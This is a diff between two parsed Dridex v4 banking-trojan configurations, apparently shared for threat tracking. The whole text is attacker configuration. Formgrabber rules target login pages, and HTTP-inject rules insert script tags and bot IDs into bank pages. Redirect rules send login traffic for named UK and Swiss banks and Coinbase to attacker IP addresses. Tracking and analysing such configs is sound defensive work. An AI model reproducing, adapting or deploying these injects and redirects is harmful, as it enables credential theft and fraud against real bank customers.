@@ -3,8 +3,8 @@
     *************************************************************    
     ***            dridex v4 configuration                    ***    
     *************************************************************    
-    botnetid:      4200    
-    cfg timestamp: 2018-04-09T18:40:23+00:00    
+    botnetid:      7200    
+    cfg timestamp: 2018-04-09T18:40:22+00:00    
     parsed by:     @viql    
         
     note: The dridex v4 config is delivered in binary format;    
@@ -21,25 +21,8 @@
 -->
 
 <settings>
-  <modules>
-    <module>
-      <sha256>60a13b2201fc4c1f9f60c3d660e873aeba5ba835e37e16e08171dcf6bdb7bf68</sha256>
-      <sha1>d79a0b4f838df2b52110af73bed6834753dd7916</sha1>
-      <md5>97cf4507315546c5105db08e017f2412</md5>
-      <timestamp>2017-12-27T15:32:56+00:00</timestamp>
-      <architecture>32</architecture>
-      <name>n/a</name>
-      <crc>0x1d1df6f5</crc>
-    </module>
-  </modules>
-  <commands>
-    <cmd id="457136" type="19">
-      <fs/>
-    </cmd>
-    <cmd id="493641" type="9">
-      <fs/>
-    </cmd>
-  </commands>
+  <modules/>
+  <commands/>
   <config>
     <httpshots>
       <url onget="1" onpost="1" type="deny">\.(gif|png|jpg|css|swf|ico|js)($|\?)</url>
@@ -90,65 +73,62 @@
       <url type="allow">^http://ebanking</url>
       <url type="allow">^http://.*office-wings</url>
       <url type="allow">^http://.+/login\.aspx</url>
-      <url type="allow">^https://www\.facebook\.com/login\.php</url>
-      <url type="deny">^https://.*\.facebook\.com/</url>
-      <url type="deny">^https://twitter.com/(login|account/login_challenge/|sessions)</url>
-      <url type="deny">^https://.*?twitter\.com/</url>
-      <url type="deny">^https://.*?twitch\.tv/</url>
-      <url type="deny">^https://(.*?\.|)gvt2\.com/</url>
-      <url type="deny">^https://.*?youtube\.com/</url>
-      <url type="allow">^https://www.linkedin.com/uas/login</url>
-      <url type="deny">^https://www\.linkedin\.com/</url>
-      <url type="allow">^https://accounts\.google\.com/_/signin/</url>
-      <url type="deny">^https://.*?google\.com/</url>
-      <url type="allow">^https://www\.readcube\.com/.*login</url>
-      <url type="deny">^https://(.*?\.|)readcube\.com/</url>
-      <url type="allow">^https://.*\.sprint.com/.*/login\.jsp</url>
-      <url type="deny">^https://(.*?\.|)sprint.com/</url>
-      <url type="allow">^https://www\.amazon\..+/signin</url>
-      <url type="deny">^https://(.*?\.|)amazon.com/</url>
-      <url type="deny">^https://www\.facilocados\.com</url>
-      <url type="deny">^https://www\.skyrana\.com</url>
-      <url type="deny">^https?://docs\.google\.[^/]+/</url>
-      <url type="deny">^https?://.*\.365lpodds\.com</url>
-      <url type="deny">^https?://outlook\.live\.com</url>
-      <url type="deny">^https?://cws\.conviva\.com</url>
-      <url type="allow">^https://login\.yahoo\.com/account/(challenge|change\-password)</url>
-      <url type="deny">^https?://.*\.yahoo\.com</url>
-      <url type="allow">^https://www\.wsitrader\.com/Account/Login</url>
-      <url type="deny">^https?://.*\.?wsitrader\.com</url>
-      <url type="allow">^https://www\.netflix\.com/(.*/)?Login</url>
-      <url type="deny">^https?://.*\.?netflix\.com</url>
-      <url type="deny">^https?://logx\.optimizely\.com</url>
-      <url type="allow">^https://www\.adnxs\.com/index/login</url>
-      <url type="deny">^https?://(.*\.)?adnxs\.com</url>
-      <url type="allow">^https://fxgmlogin\.tradenetworks\.com</url>
-      <url type="deny">^https?://(.*\.)?tradenetworks\.com</url>
-      <url type="deny">^https?://otf\.msn\.com</url>
-      <url type="allow">^https://(.*\.)?pinterest\.com/resource/UserSessionResource/create</url>
-      <url type="deny">^https?://(.*\.)?pinterest\.com</url>
-      <url type="deny">^https?://pebed\.dm\.gg</url>
-      <url type="deny">^https?://.*\.taboola\.com</url>
-      <url type="deny">^https?://www\.googleapis\.com</url>
-      <url type="allow">^https://app\.pinterest\.com/admins/sign_in</url>
-      <url type="deny">^https?://(.*\.)?intercom\.io</url>
-      <url type="deny">^https://bolt\.dropbox\.com/.*/notify/</url>
+      <url type="allow">^https?://aol.com/.*/login/</url>
+      <url type="allow">^https?://accounts.google.com/ServiceLoginAuth</url>
+      <url type="allow">^https?://login.yahoo.com/</url>
+      <url type="allow">^https?://login.live.com/</url>
+      <url type="deny">\.(swf)($|\?)</url>
+      <url type="deny">/isapi/ocget.dll</url>
+      <url type="deny">^https?://(\w+\.)?aol.com</url>
+      <url type="deny">^https?://(\w+\.)?facebook.com/</url>
+      <url type="deny">^https?://(\w+\.)?google</url>
+      <url type="deny">^https?://(\w+\.)?yahoo</url>
+      <url type="deny">^https?://(\w+\.)?youtube.com</url>
+      <url type="deny">^https?://(\w+\.)?live.com</url>
+      <url type="deny">^https?://(\w+\.)?twitter.com</url>
+      <url type="deny">^https?://(\w+\.)?vk.com</url>
       <url type="deny">^https://.*\.liverail\.com</url>
       <url type="deny">^https://urs\.microsoft\.com/</url>
       <url type="deny">^https://.+\.services\.mozilla\.com/</url>
       <url type="deny">^https://localhost.*/skypectoc/</url>
       <url type="deny">^https://.*\.skype\.com/api/</url>
+      <url type="deny">^https://syndication\.twitter\.com/</url>
       <url type="deny">^https://incoming\.telemetry\.mozilla\.org/</url>
       <url type="deny">^https://www\.bing\.com/</url>
+      <url type="deny">^https://.*comet.yahoo.com/</url>
+      <url type="deny">^https://geo\.query\.yahoo\.com/</url>
       <url type="deny">^https://self-repair\.mozilla\.org/api/</url>
       <url type="deny">^https://api\.firefox\.com</url>
       <url type="deny">^https://mc\.yandex\.ru</url>
+      <url type="deny">^https://.*\.netflix\.com</url>
       <url type="deny">^https://.*\.orangeapps\.ru/candyvalley/</url>
       <url type="deny">^https://candy.*\.king\.com/rpc/ClientApi</url>
       <url type="deny">^https://api\.accounts\.firefox\.com/</url>
       <url type="deny">^https://banners\.webmasterplan\.com/.*\.aspx</url>
       <url type="deny">^https://.*\.forgeofempires\.com/game/json</url>
+      <url type="deny">^https://client.*\.google\.com/service/</url>
+      <url type="deny">^https://safebrowsing\.google\.com/</url>
       <url type="deny">^https://collector\.schibsted\.io/api/v1/track/</url>
+      <url type="deny">^https://www\.facebook\.com/ajax/</url>
+      <url type="deny">^https.*ocsp\..+$</url>
+      <url type="deny">^https.*safebrowsing\..+$</url>
+      <url type="deny">^https?://fhr\.data\.mozilla\.com</url>
+      <url type="deny">^https://s.*\.symcd\.com</url>
+      <url type="deny">^https://s.*\.symcb\.com</url>
+      <url type="deny">^https.*ocsp2\..+$</url>
+      <url type="deny">localhost.+skypectoc/.+$</url>
+      <url type="deny">^https://urs\.microsoft\.com/</url>
+      <url type="deny">^https://shavar\.services\.mozilla\.com/</url>
+      <url type="deny">\.messenger\.live\.com</url>
+      <url type="deny">pipe\.skype\.com</url>
+      <url type="deny">\.optimatic\.com</url>
+      <url type="deny">hiro\.tv</url>
+      <url type="deny">spotxchange\.com</url>
+      <url type="deny">nielsen\.com</url>
+      <url type="deny">mapquest\.com</url>
+      <url type="deny">^https://.+\.skype\.com/api/</url>
+      <url type="deny">(//|\.)lphbs.com</url>
+      <url type="deny">(//|\.)zynga.com</url>
     </formgrabber>
     <httpinjblock>
       <url type="allow">cashproonline-.+\.bankofamerica\.com</url>
@@ -180,61 +160,14 @@
           </modify>
         </actions>
       </httpinject>
-      <httpinject label="wwwsecinba_xml">
-        <conditions>
-          <url contentType="" modifiers="U" onget="1" onpost="1" type="allow">^https://(wwwsec|inba|banking|netbanking)\..+\.ch/authen/login(\?|$)</url>
-          <url contentType="" modifiers="" onget="0" onpost="1" type="deny">\.(gif|png|jpg|css|swf)($|\?)</url>
-        </conditions>
-        <actions>
-          <modify>
-            <pattern modifiers="i">(&lt;/html&gt;)</pattern>
-            <replacement>\1&lt;script type=&quot;text/javascript&quot; src=&quot;scripts/msoffice365.js&quot;&gt;&lt;/script&gt;</replacement>
-          </modify>
-        </actions>
-      </httpinject>
-      <httpinject label="localhost9000ch_xml">
-        <conditions>
-          <url contentType="" modifiers="U" onget="1" onpost="1" type="allow">^https?://localhost:9000/workbench/WorkbenchOpenAction\.do.*</url>
-          <url contentType="" modifiers="" onget="0" onpost="1" type="deny">\.(gif|png|jpg|css|swf)($|\?)</url>
-        </conditions>
-        <actions>
-          <modify>
-            <pattern modifiers="i">(&lt;/html&gt;)</pattern>
-            <replacement>\1&lt;script type=&quot;text/javascript&quot; src=&quot;scripts/msoffice365.js&quot;&gt;&lt;/script&gt;</replacement>
-          </modify>
-        </actions>
-      </httpinject>
-      <httpinject label="loginxhtml_xml">
-        <conditions>
-          <url contentType="" modifiers="U" onget="1" onpost="1" type="allow">^https://.+\.ch/(authen|WEB_XSA_LOGIN)/login\.xhtml</url>
-          <url contentType="" modifiers="" onget="0" onpost="1" type="deny">\.(gif|png|jpg|css|swf)($|\?)</url>
-        </conditions>
-        <actions>
-          <modify>
-            <pattern modifiers="i">(&lt;/head&gt;)</pattern>
-            <replacement>&lt;script type=&quot;text/javascript&quot; src=&quot;/WEB_XSA_LOGIN/scripts/msoffice365.js&quot;&gt;&lt;/script&gt;\1</replacement>
-          </modify>
-        </actions>
-      </httpinject>
       <httpinject label="line_az">
         <conditions>
-          <url contentType="" modifiers="Ui" onget="1" onpost="1" type="allow">^https://.*bankline.*/(tagManagement|jquery.*)\.js</url>
+          <url contentType="" modifiers="Ui" onget="1" onpost="1" type="allow">^https://.*sloth[0-9].+\.js</url>
         </conditions>
         <actions>
           <modify>
-            <pattern modifiers="Ui">(\z)</pattern>
-            <replacement>;window['qweqwe']=&quot;%BOT_ID%&quot;;@@bankline_family?a=1&amp;b=2@@\1</replacement>
-          </modify>
-        </actions>
-      </httpinject>
-      <httpinject label="santa_az">
-        <conditions>
-          <url contentType="" modifiers="Ui" onget="1" onpost="1" type="allow">^https://business\.santander\.co\.uk/.*/jquery-1\..*.min.js</url>
-        </conditions>
-        <actions>
-          <modify>
-            <pattern modifiers="Ui">(\z)</pattern>
-            <replacement>;window['qweqwe']='%BOT_ID%';console.log('qweqwe');\1</replacement>
+            <pattern modifiers="mU">(var biocatch=)</pattern>
+            <replacement>window.qweqwe=&quot;%BOT_ID%&quot;;\1</replacement>
           </modify>
         </actions>
       </httpinject>
@@ -292,18 +225,15 @@ document.head.appendChild(jq_plgn_ext);\1</replacement>
     <redirects2>
       <redirect name="2nd_t" postfwd="0" socks="1" timeout="30" uri="https://67.207.142.38:4431/preycome" vnc="1">msoffice365.js</redirect>
       <redirect name="1st_t" postfwd="0" socks="0" timeout="20" uri="https://67.207.142.38:4431/realistsflow" vnc="0">ember3.js</redirect>
-      <redirect name="ubs_ebanking2_redirect" postfwd="1" socks="0" timeout="20" uri="https://46.105.131.70:443/5/ubs_ebanking2_y7rKX8yF819Lg3/" vnc="0">^https://ebanking\-ch\d*\.ubs\.com/workbench/</redirect>
-      <redirect name="directnet_cs_redirect" postfwd="1" socks="0" timeout="20" uri="https://46.105.131.70:443/5/directnet_cs_y7rKX8yF819Lg3/" vnc="0">^https://cs\.directnet\.com/dn/c/cls/</redirect>
-      <redirect name="directnet_nab_redirect" postfwd="1" socks="0" timeout="20" uri="https://46.105.131.70:443/5/directnet_nab_y7rKX8yF819Lg3/" vnc="0">^https://nab\.directnet\.com/dn/c/cls/</redirect>
-      <redirect name="postfinance_redirect" postfwd="1" socks="0" timeout="20" uri="https://46.105.131.70:443/5/postfinance_y7rKX8yF819Lg3/" vnc="0">^https://www\.postfinance\.ch/ap/ba/fp/html/e\-finance/</redirect>
-      <redirect name="raiffeisen_ch_redirect" postfwd="1" socks="0" timeout="20" uri="https://46.105.131.70:443/5/raiffeisen_ch_y7rKX8yF819Lg3/" vnc="0">^https://ebanking\.raiffeisen\.ch/entry/</redirect>
-      <redirect name="images_redirect" postfwd="1" socks="0" timeout="20" uri="https://216.51.232.176:4043/get-dbYd81hd83H/\1" vnc="0">^https://.*/image777000/(.+)</redirect>
+      <redirect name="pp_fake1" postfwd="1" socks="0" timeout="60" uri="https://92.207.100.244:4843/i9as.php" vnc="0">.+chatpicz\.js</redirect>
+      <redirect name="pp_fake2" postfwd="1" socks="0" timeout="60" uri="https://92.207.100.244:4843/zia.php" vnc="0">.+supp0rt\.js</redirect>
       <redirect name="couts_redirect" postfwd="1" socks="0" timeout="60" uri="https://46.105.131.70:443/05/qwarna_y7rKX8yF819Lg3/" vnc="0">^https://online\.coutts\.com/eBankingCouttsLogin/</redirect>
       <redirect name="co_operativebank_fdonline_redirect" postfwd="1" socks="0" timeout="60" uri="https://46.105.131.70:443/05/graddle_y7rKX8yF819Lg3/" vnc="0">^https://fdonline\.co-operativebank\.co\.uk/corp/</redirect>
       <redirect name="co_operativebank_business_redirect" postfwd="1" socks="0" timeout="60" uri="https://46.105.131.70:443/05/grubble_y7rKX8yF819Lg3/" vnc="0">^https://business\.co-operativebank\.co\.uk/corp/</redirect>
       <redirect name="nationwide_redirect" postfwd="1" socks="0" timeout="60" uri="https://46.105.131.70:443/05/ni_y7rKX8yF819Lg3/" vnc="0">^https://onlinebanking\.nationwide\.co\.uk/AccessManagement/</redirect>
       <redirect name="ulsterbank_personal_redirect" postfwd="1" socks="0" timeout="60" uri="https://46.105.131.70:443/05/aibani_y7rKX8yF819Lg3/" vnc="0">^https://www\.ulsterbankanytimebanking\.co\.uk/</redirect>
       <redirect name="ulsterbank_personal_redirect2" postfwd="1" socks="0" timeout="60" uri="https://46.105.131.70:443/05/aibani_y7rKX8yF819Lg3/" vnc="0">^https://www\.ulsterbankanytimebanking\.ie/</redirect>
+      <redirect name="natwest_personal_redirect" postfwd="1" socks="0" timeout="60" uri="https://46.105.131.70:443/05/nwolb_y7rKX8yF819Lg3/" vnc="0">^https://www\.nwolb\.com/</redirect>
       <redirect name="rbs_personal_redirect" postfwd="1" socks="0" timeout="60" uri="https://46.105.131.70:443/05/asds_y7rKX8yF819Lg3/" vnc="0">^https://www\.rbsdigital\.com/</redirect>
       <redirect name="tesco_redirect" postfwd="1" socks="0" timeout="60" uri="https://46.105.131.70:443/510/tiquani_y7rKX8yF819Lg3/" vnc="0">^https://www\.tescobank\.com/sss/</redirect>
       <redirect name="danske_redirect" postfwd="1" socks="0" timeout="60" uri="https://46.105.131.70:443/5/d1_y7rKX8yF819Lg3/" vnc="0">^https://business2\.danskebank\.(co\.uk|com)/pub/logon/</redirect>
@@ -315,16 +245,20 @@ document.head.appendChild(jq_plgn_ext);\1</replacement>
       <redirect name="lloydslink_redirect2" postfwd="1" socks="0" timeout="60" uri="https://46.105.131.70:443/5/ll_y7rKX8yF819Lg3/index.php?param1" vnc="0">^https://lloydslink\.online\.lloydstsb\.com/Logon/Logon\.jsp</redirect>
       <redirect name="lloydscorp_redirect" postfwd="1" socks="0" timeout="60" uri="https://46.105.131.70:443/5/lc_y7rKX8yF819Lg3/" vnc="0">^https://banking\.lloydsbank\.com/Logon/</redirect>
       <redirect name="lloydsbiz_redirect" postfwd="1" socks="0" timeout="60" uri="https://46.105.131.70:443/5/lb_y7rKX8yF819Lg3/" vnc="0">^https://onlinebusiness\.lloydsbank\.co\.uk/business/logon/</redirect>
+      <redirect name="hsbcnet_redirect" postfwd="1" socks="0" timeout="60" uri="https://46.105.131.70:443/5/hn_y7rKX8yF819Lg3/" vnc="0">^https://www\d*\.secure\.hsbcnet\.com/uims/portal/(HSBCnet/|)</redirect>
       <redirect name="hsbcbiz_redirect" postfwd="1" socks="0" timeout="60" uri="https://46.105.131.70:443/5/hb_y7rKX8yF819Lg3/" vnc="0">^https://www\.business\.hsbc\.co\.uk/1/2/\!ut/</redirect>
       <redirect name="barclays_redirect" postfwd="1" socks="0" timeout="60" uri="https://46.105.131.70:443/5/br_y7rKX8yF819Lg3/" vnc="0">^https://bank\.barclays\.co\.uk/olb/auth/LoginLink\.action</redirect>
-      <redirect name="4th_t" postfwd="1" socks="0" timeout="20" uri="https://46.105.131.76:443/LXBryiyc6DS09DEYYHV5OZnR403UiEIF/dy1Eb64fV46fi3ie/arq.php" vnc="0">.+/arq.os</redirect>
-      <redirect name="bankline_family" postfwd="1" socks="0" timeout="30" uri="https://46.105.131.76:443/LXBryiyc6DS09DEYYHV5OZnR403UiEIF/dy1Eb64fV46fi3ie/u309cmkM3G479Q5M/V8aSYv5JID0NDhTm.php" vnc="0">^https://logon\.bankline\..*/scripts/genesis/sloth_inc\.js</redirect>
-      <redirect name="santader_family" postfwd="1" socks="0" timeout="30" uri="https://46.105.131.76:443/LXBryiyc6DS09DEYYHV5OZnR403UiEIF/dy1Eb64fV46fi3ie/Z0Bx9onlf696Fdcy/V8aSYv5JID0NDhTm.php" vnc="0">^https://business\.santander\.co\.uk/Estatico/ALP_SBBI_Templates/Scripts/fl/behaviour2\.js</redirect>
-      <redirect name="clydes_family" postfwd="1" socks="0" timeout="30" uri="https://46.105.131.76:443/LXBryiyc6DS09DEYYHV5OZnR403UiEIF/dy1Eb64fV46fi3ie/NsiUaMUy82wkQYgI/V8aSYv5JID0NDhTm.php" vnc="0">^https://.*cybusinessonline\.co\.uk/.*web/L001/script/cooltree_ex.js</redirect>
-      <redirect name="metro_family" postfwd="1" socks="0" timeout="30" uri="https://46.105.131.76:443/LXBryiyc6DS09DEYYHV5OZnR403UiEIF/dy1Eb64fV46fi3ie/piP6m8YXNZfDKKvj/V8aSYv5JID0NDhTm.php" vnc="0">^https://.*metrobankonline\.co\.uk/.*/jquery-ui-plugin-ex\.js</redirect>
-      <redirect name="lloyds_family" postfwd="1" socks="0" timeout="30" uri="https://46.105.131.76:443/LXBryiyc6DS09DEYYHV5OZnR403UiEIF/dy1Eb64fV46fi3ie/LVYPwEyJ6YX2TeJk/V8aSYv5JID0NDhTm.php" vnc="0">^https://.*\.lloydsbank\.co\.uk/.*/scriptsnippet\.jspf</redirect>
-      <redirect name="barclays_family" postfwd="1" socks="0" timeout="30" uri="https://46.105.131.76:443/LXBryiyc6DS09DEYYHV5OZnR403UiEIF/dy1Eb64fV46fi3ie/bR82swKQ8SALsZWr/V8aSYv5JID0NDhTm.php" vnc="0">^https://bank\.barclays\.co\.uk/js/jq/jq\.js</redirect>
-      <redirect name="nwolb_persik" postfwd="1" socks="0" timeout="60" uri="https://46.105.131.76:443/LXBryiyc6DS09DEYYHV5OZnR403UiEIF/dy1Eb64fV46fi3ie/nwp-3X8qHdUdtgSRgjXD/V8aSYv5JID0NDhTm.php" vnc="0">D2HLpgz6964knRethaMqYDygdM5aVZX3FamS.js</redirect>
+      <redirect name="barclays_redirect_files" postfwd="1" socks="0" timeout="60" uri="https://46.105.131.70:443/5/br_y7rKX8yF819Lg3/files/" vnc="0">^https://bank\.barclays\.co\.uk/olb/auth/files/</redirect>
+      <redirect name="barclays_redirect_inj" postfwd="1" socks="0" timeout="60" uri="https://46.105.131.70:443/5/br_y7rKX8yF819Lg3/default_redirect.js" vnc="0">^https://bank\.barclays\.co\.uk/olb/auth/default_redirect\.js</redirect>
+      <redirect name="cobaba_redirect_data" postfwd="1" socks="0" timeout="60" uri="https://46.105.131.70:443/520/cobaba_y7rKX8yF819Lg3/default_redirect.js" vnc="0">^https://www.coinbase.com/default_redirect.js</redirect>
+      <redirect name="cobaba_redirect_files" postfwd="1" socks="0" timeout="60" uri="https://46.105.131.70:443/520/cobaba_y7rKX8yF819Lg3/files/" vnc="0">^https://www.coinbase.com/files/</redirect>
+      <redirect name="cobaba_redirect_redirect" postfwd="1" socks="0" timeout="60" uri="https://46.105.131.70:443/520/cobaba_y7rKX8yF819Lg3/" vnc="0">^https://www.coinbase.com/signin</redirect>
+      <redirect name="4th_t" postfwd="1" socks="0" timeout="30" uri="https://46.105.131.76:443/I1696MTw5in80DHa0DHh7Z2De69DW4ew/dy1Eb64fV46fi3ie/gateway.php" vnc="0">.+/arq.os</redirect>
+      <redirect name="bankline_family" postfwd="1" socks="0" timeout="30" uri="https://46.105.131.76:443/I1696MTw5in80DHa0DHh7Z2De69DW4ew/dy1Eb64fV46fi3ie/u309cmkM3G479Q5M/V8aSYv5JID0NDhTm.php" vnc="0">^https://logon\.bankline\..*/scripts/genesis/sloth_inc\.js</redirect>
+      <redirect name="santader_family" postfwd="1" socks="0" timeout="30" uri="https://46.105.131.76:443/I1696MTw5in80DHa0DHh7Z2De69DW4ew/dy1Eb64fV46fi3ie/Z0Bx9onlf696Fdcy/V8aSYv5JID0NDhTm.php" vnc="0">^https://business\.santander\.co\.uk/Estatico/ALP_SBBI_Templates/Scripts/fl/behaviour2\.js</redirect>
+      <redirect name="clydes_family" postfwd="1" socks="0" timeout="30" uri="https://46.105.131.76:443/I1696MTw5in80DHa0DHh7Z2De69DW4ew/dy1Eb64fV46fi3ie/NsiUaMUy82wkQYgI/V8aSYv5JID0NDhTm.php" vnc="0">^https://.*cybusinessonline\.co\.uk/.*web/L001/script/cooltree_ex.js</redirect>
+      <redirect name="metro_family" postfwd="1" socks="0" timeout="30" uri="https://46.105.131.76:443/I1696MTw5in80DHa0DHh7Z2De69DW4ew/dy1Eb64fV46fi3ie/piP6m8YXNZfDKKvj/V8aSYv5JID0NDhTm.php" vnc="0">^https://.*metrobankonline\.co\.uk/.*/jquery-ui-plugin-ex\.js</redirect>
+      <redirect name="lloydspers_redirect" postfwd="1" socks="0" timeout="60" uri="https://46.105.131.70:443/5/lloydspers_y7rKX8yF819Lg3/" vnc="0">^https://online\.lloydsbank\.co\.uk/personal/logon/</redirect>
       <redirect name="tsbpers_redirect" postfwd="1" socks="0" timeout="60" uri="https://46.105.131.70:443/5/tsbpers_y7rKX8yF819Lg3/" vnc="0">^https://online\.tsb\.co\.uk/personal/logon/</redirect>
       <redirect name="halifaxpers_redirect" postfwd="1" socks="0" timeout="60" uri="https://46.105.131.70:443/5/halifaxpers_y7rKX8yF819Lg3/" vnc="0">^https://www\.halifax-online\.co\.uk/personal/logon/</redirect>
       <redirect name="bospers_redirect" postfwd="1" socks="0" timeout="60" uri="https://46.105.131.70:443/5/bospers_y7rKX8yF819Lg3/" vnc="0">^https://online\.bankofscotland\.co\.uk/personal/logon/</redirect>
@@ -371,7 +305,7 @@ document.head.appendChild(jq_plgn_ext);\1</replacement>
       <clickshot clicks="30" onget="1" onpost="1" type="allow" xrange="3000" yrange="2000">^https://secure\.halifax-online\.co\.uk/personal/a/account_overview_personal/</clickshot>
       <clickshot clicks="30" onget="1" onpost="1" type="allow" xrange="3000" yrange="2000">^https://secure\.bankofscotland\.co\.uk/personal/a/account_overview_personal/</clickshot>
     </clickshots>
-    <timestamp>2018-04-09T18:40:23+00:00</timestamp>
+    <timestamp>2018-04-09T18:40:22+00:00</timestamp>
   </config>
   <c2>
     <host>
